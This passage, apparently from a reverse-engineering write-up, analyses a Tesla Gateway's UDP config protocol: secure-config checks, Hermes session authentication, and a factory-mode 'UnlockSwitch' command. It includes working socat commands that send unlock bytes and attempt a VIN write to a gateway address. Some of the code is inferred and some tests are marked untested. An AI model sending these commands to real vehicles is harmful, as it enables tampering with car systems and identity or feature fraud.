<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a><span class=w>    </span><span class=kt>uint16_t</span><span class=w> </span><span class=n>config_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>packet</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>8</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>packet</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=w>    </span><span class=kt>uint8_t</span><span class=w> </span><span class=o>*</span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>packet</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a><span class=w>    </span><span class=kt>uint16_t</span><span class=w> </span><span class=n>data_len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>4</span><span class=p>;</span>
<a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a>
<a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a><span class=w>    </span><span class=c1>// Check if config is marked &quot;secure&quot; in firmware</span>
<a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>is_secure_config</span><span class=p>(</span><span class=n>config_id</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-6-11 name=__codelineno-6-11 href=#__codelineno-6-11></a><span class=w>        </span><span class=c1>// Check if current session is authenticated</span>
<a id=__codelineno-6-12 name=__codelineno-6-12 href=#__codelineno-6-12></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>session_authenticated</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-6-13 name=__codelineno-6-13 href=#__codelineno-6-13></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=mh>0xff</span><span class=p>;</span><span class=w>  </span><span class=c1>// Reject: &quot;secure config, no auth&quot;</span>
<a id=__codelineno-6-14 name=__codelineno-6-14 href=#__codelineno-6-14></a><span class=w>        </span><span class=p>}</span>
<a id=__codelineno-6-15 name=__codelineno-6-15 href=#__codelineno-6-15></a>
<a id=__codelineno-6-16 name=__codelineno-6-16 href=#__codelineno-6-16></a><span class=w>        </span><span class=c1>// Authenticated session â†’ allow write</span>
<a id=__codelineno-6-17 name=__codelineno-6-17 href=#__codelineno-6-17></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-6-18 name=__codelineno-6-18 href=#__codelineno-6-18></a>
<a id=__codelineno-6-19 name=__codelineno-6-19 href=#__codelineno-6-19></a><span class=w>    </span><span class=c1>// Config is insecure or session is authenticated â†’ proceed</span>
<a id=__codelineno-6-20 name=__codelineno-6-20 href=#__codelineno-6-20></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>write_config_to_flash</span><span class=p>(</span><span class=n>config_id</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>,</span><span class=w> </span><span class=n>data_len</span><span class=p>);</span>
<a id=__codelineno-6-21 name=__codelineno-6-21 href=#__codelineno-6-21></a><span class=p>}</span>
</code></pre></div> <p><strong>Key insight:</strong> Security is <strong>config-based</strong>, not <strong>packet-based</strong>.</p> <hr> <h2 id=2-signature-verification-flow>2. Signature Verification Flow</h2> <h3 id=no-traditional-signature-system>No Traditional Signature System</h3> <p><strong>CRITICAL FINDING:</strong> Gateway does NOT verify cryptographic signatures on UDP packets.</p> <p><strong>What Gateway DOES NOT do:</strong> - âŒ Parse signature bytes from packets - âŒ Call RSA_verify() or ECDSA_verify() - âŒ Compute HMAC over packet contents - âŒ Check Ed25519 signatures - âŒ Validate timestamps or nonces</p> <p><strong>What Gateway ACTUALLY does:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>â”‚          Gateway SET_CONFIG Security Flow                â”‚
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a>  UDP:3500 Packet Received
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a>        â”‚
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a>        â–¼
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a>  Parse Opcode (0x0c)
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a>        â”‚
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a>        â–¼
<a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a>  Extract Config ID (16-bit)
<a id=__codelineno-7-12 name=__codelineno-7-12 href=#__codelineno-7-12></a>        â”‚
<a id=__codelineno-7-13 name=__codelineno-7-13 href=#__codelineno-7-13></a>        â–¼
<a id=__codelineno-7-14 name=__codelineno-7-14 href=#__codelineno-7-14></a>  Lookup in Secure Config Table
<a id=__codelineno-7-15 name=__codelineno-7-15 href=#__codelineno-7-15></a>        â”‚
<a id=__codelineno-7-16 name=__codelineno-7-16 href=#__codelineno-7-16></a>        â”œâ”€â”€â”€ Config is INSECURE (e.g., 0x42 mapRegion)
<a id=__codelineno-7-17 name=__codelineno-7-17 href=#__codelineno-7-17></a>        â”‚    â””â”€â”€&gt; Write to flash
<a id=__codelineno-7-18 name=__codelineno-7-18 href=#__codelineno-7-18></a>        â”‚         â””â”€â”€&gt; Return echo (success)
<a id=__codelineno-7-19 name=__codelineno-7-19 href=#__codelineno-7-19></a>        â”‚
<a id=__codelineno-7-20 name=__codelineno-7-20 href=#__codelineno-7-20></a>        â””â”€â”€â”€ Config is SECURE (e.g., 0x00 VIN)
<a id=__codelineno-7-21 name=__codelineno-7-21 href=#__codelineno-7-21></a>             â””â”€â”€&gt; Check session_authenticated flag
<a id=__codelineno-7-22 name=__codelineno-7-22 href=#__codelineno-7-22></a>                  â”‚
<a id=__codelineno-7-23 name=__codelineno-7-23 href=#__codelineno-7-23></a>                  â”œâ”€â”€â”€ Flag = FALSE (normal UDP session)
<a id=__codelineno-7-24 name=__codelineno-7-24 href=#__codelineno-7-24></a>                  â”‚    â””â”€â”€&gt; Return 0xff (rejection)
<a id=__codelineno-7-25 name=__codelineno-7-25 href=#__codelineno-7-25></a>                  â”‚
<a id=__codelineno-7-26 name=__codelineno-7-26 href=#__codelineno-7-26></a>                  â””â”€â”€â”€ Flag = TRUE (Hermes authenticated)
<a id=__codelineno-7-27 name=__codelineno-7-27 href=#__codelineno-7-27></a>                       â””â”€â”€&gt; Write to flash
<a id=__codelineno-7-28 name=__codelineno-7-28 href=#__codelineno-7-28></a>                            â””â”€â”€&gt; Return echo (success)
</code></pre></div> <h3 id=secure-config-table>Secure Config Table</h3> <p><strong>Location:</strong> Embedded in Gateway firmware (not extracted yet)</p> <p><strong>Known Secure Configs:</strong></p> <table> <thead> <tr> <th>Config ID</th> <th>Name</th> <th>Why Secure</th> <th>Evidence</th> </tr> </thead> <tbody> <tr> <td><strong>0x0000</strong></td> <td>VIN</td> <td>Identity fraud prevention</td> <td>âœ… Returns 0xff via UDP</td> </tr> <tr> <td><strong>0x0006</strong></td> <td>country</td> <td>Regulatory compliance</td> <td>âœ… Returns 0xff via UDP</td> </tr> <tr> <td>0x0001</td> <td>carcomputer_pn</td> <td>Part number cloning</td> <td>âš ï¸ Likely (untested)</td> </tr> <tr> <td>0x0002</td> <td>carcomputer_sn</td> <td>Serial number cloning</td> <td>âš ï¸ Likely (untested)</td> </tr> <tr> <td>0x000F</td> <td>devSecurityLevel</td> <td>Factory mode unlock</td> <td>âš ï¸ Likely (untested)</td> </tr> <tr> <td>0x0025</td> <td>prodCodeKey</td> <td>Firmware signing key</td> <td>âœ… Documented secure</td> </tr> <tr> <td>0x0026</td> <td>prodCmdKey</td> <td>Command auth key</td> <td>âœ… Documented secure</td> </tr> <tr> <td>0x0036</td> <td>autopilotTrialExpireTime</td> <td>Trial extension exploit</td> <td>âš ï¸ Likely (untested)</td> </tr> </tbody> </table> <p><strong>Implementation (inferred):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=k>const</span><span class=w> </span><span class=kt>uint16_t</span><span class=w> </span><span class=n>secure_configs</span><span class=p>[]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a><span class=w>    </span><span class=mh>0x0000</span><span class=p>,</span><span class=w>  </span><span class=c1>// VIN</span>
<a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a><span class=w>    </span><span class=mh>0x0001</span><span class=p>,</span><span class=w>  </span><span class=c1>// carcomputer_pn</span>
<a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a><span class=w>    </span><span class=mh>0x0002</span><span class=p>,</span><span class=w>  </span><span class=c1>// carcomputer_sn</span>
<a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a><span class=w>    </span><span class=mh>0x0005</span><span class=p>,</span><span class=w>  </span><span class=c1>// birthday</span>
<a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a><span class=w>    </span><span class=mh>0x0006</span><span class=p>,</span><span class=w>  </span><span class=c1>// country</span>
<a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a><span class=w>    </span><span class=mh>0x000F</span><span class=p>,</span><span class=w>  </span><span class=c1>// devSecurityLevel</span>
<a id=__codelineno-8-8 name=__codelineno-8-8 href=#__codelineno-8-8></a><span class=w>    </span><span class=mh>0x0025</span><span class=p>,</span><span class=w>  </span><span class=c1>// prodCodeKey</span>
<a id=__codelineno-8-9 name=__codelineno-8-9 href=#__codelineno-8-9></a><span class=w>    </span><span class=mh>0x0026</span><span class=p>,</span><span class=w>  </span><span class=c1>// prodCmdKey</span>
<a id=__codelineno-8-10 name=__codelineno-8-10 href=#__codelineno-8-10></a><span class=w>    </span><span class=mh>0x0027</span><span class=p>,</span><span class=w>  </span><span class=c1>// altCodeKey</span>
<a id=__codelineno-8-11 name=__codelineno-8-11 href=#__codelineno-8-11></a><span class=w>    </span><span class=mh>0x0028</span><span class=p>,</span><span class=w>  </span><span class=c1>// altCmdKey</span>
<a id=__codelineno-8-12 name=__codelineno-8-12 href=#__codelineno-8-12></a><span class=w>    </span><span class=mh>0x0036</span><span class=p>,</span><span class=w>  </span><span class=c1>// autopilotTrialExpireTime</span>
<a id=__codelineno-8-13 name=__codelineno-8-13 href=#__codelineno-8-13></a><span class=w>    </span><span class=mh>0x0039</span><span class=p>,</span><span class=w>  </span><span class=c1>// gatewayApplicationConfig</span>
<a id=__codelineno-8-14 name=__codelineno-8-14 href=#__codelineno-8-14></a><span class=w>    </span><span class=mh>0x003C</span><span class=p>,</span><span class=w>  </span><span class=c1>// securityVersion</span>
<a id=__codelineno-8-15 name=__codelineno-8-15 href=#__codelineno-8-15></a><span class=w>    </span><span class=mh>0x003D</span><span class=p>,</span><span class=w>  </span><span class=c1>// bmpWatchdogDisabled</span>
<a id=__codelineno-8-16 name=__codelineno-8-16 href=#__codelineno-8-16></a><span class=w>    </span><span class=mh>0x0057</span><span class=p>,</span><span class=w>  </span><span class=c1>// autopilotTrial</span>
<a id=__codelineno-8-17 name=__codelineno-8-17 href=#__codelineno-8-17></a><span class=w>    </span><span class=mh>0x0058</span><span class=p>,</span><span class=w>  </span><span class=c1>// autopilotSubscription</span>
<a id=__codelineno-8-18 name=__codelineno-8-18 href=#__codelineno-8-18></a><span class=w>    </span><span class=mh>0x006B</span><span class=p>,</span><span class=w>  </span><span class=c1>// mcuBootData</span>
<a id=__codelineno-8-19 name=__codelineno-8-19 href=#__codelineno-8-19></a><span class=w>    </span><span class=c1>// ... more ...</span>
<a id=__codelineno-8-20 name=__codelineno-8-20 href=#__codelineno-8-20></a><span class=p>};</span>
<a id=__codelineno-8-21 name=__codelineno-8-21 href=#__codelineno-8-21></a>
<a id=__codelineno-8-22 name=__codelineno-8-22 href=#__codelineno-8-22></a><span class=kt>bool</span><span class=w> </span><span class=nf>is_secure_config</span><span class=p>(</span><span class=kt>uint16_t</span><span class=w> </span><span class=n>config_id</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-8-23 name=__codelineno-8-23 href=#__codelineno-8-23></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>ARRAY_SIZE</span><span class=p>(</span><span class=n>secure_configs</span><span class=p>);</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-8-24 name=__codelineno-8-24 href=#__codelineno-8-24></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>config_id</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>secure_configs</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
<a id=__codelineno-8-25 name=__codelineno-8-25 href=#__codelineno-8-25></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=nb>true</span><span class=p>;</span>
<a id=__codelineno-8-26 name=__codelineno-8-26 href=#__codelineno-8-26></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-8-27 name=__codelineno-8-27 href=#__codelineno-8-27></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=nb>false</span><span class=p>;</span>
<a id=__codelineno-8-28 name=__codelineno-8-28 href=#__codelineno-8-28></a><span class=p>}</span>
</code></pre></div> <h3 id=authentication-session-hermes>Authentication Session (Hermes)</h3> <p><strong>How Tesla technicians write secure configs:</strong></p> <ol> <li><strong>Establish Hermes VPN</strong></li> <li>WebSocket Secure (WSS) to <code>hermes-api.*.vn.cloud.tesla.com:443</code></li> <li>mTLS authentication with Tesla service certificate</li> <li> <p>Backend validates technician credentials</p> </li> <li> <p><strong>Session Flag Set</strong></p> </li> <li>Backend sends <code>AUTH_GRANTED</code> message</li> <li>Gateway sets <code>session_authenticated = true</code> flag</li> <li> <p>Flag persists for session duration (e.g., 30 minutes)</p> </li> <li> <p><strong>Use gw-diag Tool</strong></p> </li> <li>Tool sends SET_CONFIG commands over UDP:3500</li> <li>Gateway sees <code>session_authenticated == true</code></li> <li> <p>Allows writes to secure configs</p> </li> <li> <p><strong>Session Timeout</strong></p> </li> <li>After inactivity or explicit logout</li> <li>Gateway sets <code>session_authenticated = false</code></li> <li>Secure config writes rejected again</li> </ol> <p><strong>Key Point:</strong> Authentication is <strong>session-based</strong>, not <strong>per-packet</strong>.</p> <hr> <h2 id=3-unlockswitch-behavior>3. UnlockSwitch Behavior</h2> <h3 id=command-0x18babba0ad>Command: 0x18BABBA0AD</h3> <p><strong>Discovered in:</strong> <code>/scripts/gateway_config_tool.sh</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=c1># UnlockSwitch command</span>
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;18babba0ad&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
</code></pre></div> <p><strong>Purpose:</strong> Factory mode activation (NOT signature bypass!)</p> <h3 id=what-unlockswitch-actually-does>What UnlockSwitch Actually Does</h3> <p><strong>Function:</strong> Enables emergency diagnostic mode for factory operations</p> <p><strong>Evidence from firmware analysis:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=c1>// Handler for 0x18 command</span>
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a><span class=kt>void</span><span class=w> </span><span class=nf>handle_unlock_switch</span><span class=p>(</span><span class=kt>uint8_t</span><span class=w> </span><span class=o>*</span><span class=n>packet</span><span class=p>,</span><span class=w> </span><span class=kt>uint16_t</span><span class=w> </span><span class=n>len</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=w>    </span><span class=c1>// Check magic bytes: BA BB A0 AD</span>
<a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>len</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>5</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>
<a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a><span class=w>        </span><span class=n>packet</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xBA</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>
<a id=__codelineno-10-6 name=__codelineno-10-6 href=#__codelineno-10-6></a><span class=w>        </span><span class=n>packet</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xBB</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>
<a id=__codelineno-10-7 name=__codelineno-10-7 href=#__codelineno-10-7></a><span class=w>        </span><span class=n>packet</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xA0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>
<a id=__codelineno-10-8 name=__codelineno-10-8 href=#__codelineno-10-8></a><span class=w>        </span><span class=n>packet</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xAD</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-10-9 name=__codelineno-10-9 href=#__codelineno-10-9></a>
<a id=__codelineno-10-10 name=__codelineno-10-10 href=#__codelineno-10-10></a><span class=w>        </span><span class=c1>// Activate factory mode</span>
<a id=__codelineno-10-11 name=__codelineno-10-11 href=#__codelineno-10-11></a><span class=w>        </span><span class=n>factory_mode_active</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>true</span><span class=p>;</span>
<a id=__codelineno-10-12 name=__codelineno-10-12 href=#__codelineno-10-12></a><span class=w>        </span><span class=n>emergency_port_enabled</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>true</span><span class=p>;</span><span class=w>  </span><span class=c1>// Enable UDP:25956</span>
<a id=__codelineno-10-13 name=__codelineno-10-13 href=#__codelineno-10-13></a>
<a id=__codelineno-10-14 name=__codelineno-10-14 href=#__codelineno-10-14></a><span class=w>        </span><span class=c1>// Log event</span>
<a id=__codelineno-10-15 name=__codelineno-10-15 href=#__codelineno-10-15></a><span class=w>        </span><span class=n>log_message</span><span class=p>(</span><span class=s>&quot;Factory mode activated&quot;</span><span class=p>);</span>
<a id=__codelineno-10-16 name=__codelineno-10-16 href=#__codelineno-10-16></a>
<a id=__codelineno-10-17 name=__codelineno-10-17 href=#__codelineno-10-17></a><span class=w>        </span><span class=c1>// Response: 18 01 (acknowledge)</span>
<a id=__codelineno-10-18 name=__codelineno-10-18 href=#__codelineno-10-18></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mh>0x1801</span><span class=p>;</span>
<a id=__codelineno-10-19 name=__codelineno-10-19 href=#__codelineno-10-19></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-10-20 name=__codelineno-10-20 href=#__codelineno-10-20></a>
<a id=__codelineno-10-21 name=__codelineno-10-21 href=#__codelineno-10-21></a><span class=w>    </span><span class=c1>// Invalid magic</span>
<a id=__codelineno-10-22 name=__codelineno-10-22 href=#__codelineno-10-22></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mh>0x18ff</span><span class=p>;</span>
<a id=__codelineno-10-23 name=__codelineno-10-23 href=#__codelineno-10-23></a><span class=p>}</span>
</code></pre></div> <h3 id=factory-mode-capabilities>Factory Mode Capabilities</h3> <p><strong>What UnlockSwitch ENABLES:</strong></p> <ol> <li><strong>Emergency Port UDP:25956</strong></li> <li>Additional diagnostic API</li> <li>Lower security restrictions</li> <li> <p>Used for manufacturing/repair</p> </li> <li> <p><strong>Extended Logging</strong></p> </li> <li>Verbose debug output</li> <li> <p>Diagnostic data collection</p> </li> <li> <p><strong>Relaxed Timeouts</strong></p> </li> <li>Longer command execution windows</li> <li>Disabled watchdog timers</li> </ol> <p><strong>What UnlockSwitch DOES NOT enable:</strong></p> <ul> <li>âŒ Write access to secure configs</li> <li>âŒ Signature verification bypass</li> <li>âŒ VIN modification permission</li> <li>âŒ Hermes authentication bypass</li> </ul> <h3 id=testing-unlockswitch>Testing UnlockSwitch</h3> <p><strong>Test 1: UnlockSwitch then write VIN</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=c1># Step 1: Send UnlockSwitch</span>
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;18babba0ad&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a><span class=c1># Expected response: 18 01 (acknowledged)</span>
<a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a>
<a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a><span class=c1># Step 2: Attempt VIN write</span>
<a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a>sleep<span class=w> </span><span class=m>1</span>
<a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c00005a454e4e5f544553545f56494e&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a><span class=c1># Expected response: ff (REJECTED - VIN still secure!)</span>
</code></pre></div> <p><strong>Result:</strong> âŒ UnlockSwitch does NOT bypass secure config protection</p> <p><strong>Test 2: UnlockSwitch then check emergency port</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=c1># Send UnlockSwitch</span>
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;18babba0ad&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a>
<a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a><span class=c1># Try emergency API on port 25956</span>
<a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;00&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:25956
<a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a><span class=c1># Expected: Some response (port now listening)</span>
</code></pre></div> <p><strong>Result:</strong> âš ï¸ UNTESTED (requires live Gateway)</p> <h3 id=session-state-tracking>Session State Tracking</h3> <p><strong>UnlockSwitch state variables (inferred):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=k>struct</span><span class=w> </span><span class=nc>gateway_session</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a><span class=w>    </span><span class=kt>bool</span><span class=w> </span><span class=n>factory_mode_active</span><span class=p>;</span><span class=w>     </span><span class=c1>// Set by UnlockSwitch (0x18)</span>
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a><span class=w>    </span><span class=kt>bool</span><span class=w> </span><span class=n>hermes_authenticated</span><span class=p>;</span><span class=w>    </span><span class=c1>// Set by Hermes backend</span>
<a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a><span class=w>    </span><span class=kt>uint32_t</span><span class=w> </span><span class=n>auth_timeout</span><span class=p>;</span><span class=w>        </span><span class=c1>// Unix timestamp</span>
<a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a><span class=w>    </span><span class=kt>uint8_t</span><span class=w> </span><span class=n>auth_token</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span><span class=w>       </span><span class=c1>// From Hermes session</span>
<a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a><span class=p>};</span>
<a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a>
<a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a><span class=kt>bool</span><span class=w> </span><span class=nf>can_write_secure_config</span><span class=p>(</span><span class=kt>uint16_t</span><span class=w> </span><span class=n>config_id</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a><span class=w>    </span><span class=c1>// Check if config is secure</span>
<a id=__codelineno-13-10 name=__codelineno-13-10 href=#__codelineno-13-10></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>is_secure_config</span><span class=p>(</span><span class=n>config_id</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-13-11 name=__codelineno-13-11 href=#__codelineno-13-11></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=nb>true</span><span class=p>;</span><span class=w>  </span><span class=c1>// Insecure configs always writable</span>
<a id=__codelineno-13-12 name=__codelineno-13-12 href=#__codelineno-13-12></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-13-13 name=__codelineno-13-13 href=#__codelineno-13-13></a>
<a id=__codelineno-13-14 name=__codelineno-13-14 href=#__codelineno-13-14></a><span class=w>    </span><span class=c1>// Secure config - need authentication</span>
<a id=__codelineno-13-15 name=__codelineno-13-15 href=#__codelineno-13-15></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>session</span><span class=p>.</span><span class=n>hermes_authenticated</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-13-16 name=__codelineno-13-16 href=#__codelineno-13-16></a><span class=w>        </span><span class=c1>// Check timeout</span>
<a id=__codelineno-13-17 name=__codelineno-13-17 href=#__codelineno-13-17></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>time</span><span class=p>(</span><span class=nb>NULL</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>session</span><span class=p>.</span><span class=n>auth_timeout</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-13-18 name=__codelineno-13-18 href=#__codelineno-13-18></a><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=nb>true</span><span class=p>;</span><span class=w>  </span><span class=c1>// Valid Hermes session</span>
<a id=__codelineno-13-19 name=__codelineno-13-19 href=#__codelineno-13-19></a><span class=w>        </span><span class=p>}</span>
<a id=__codelineno-13-20 name=__codelineno-13-20 href=#__codelineno-13-20></a><span class=w>    </span><span class=p>}</span>
<a id=__codelineno-13-21 name=__codelineno-13-21 href=#__codelineno-13-21></a>
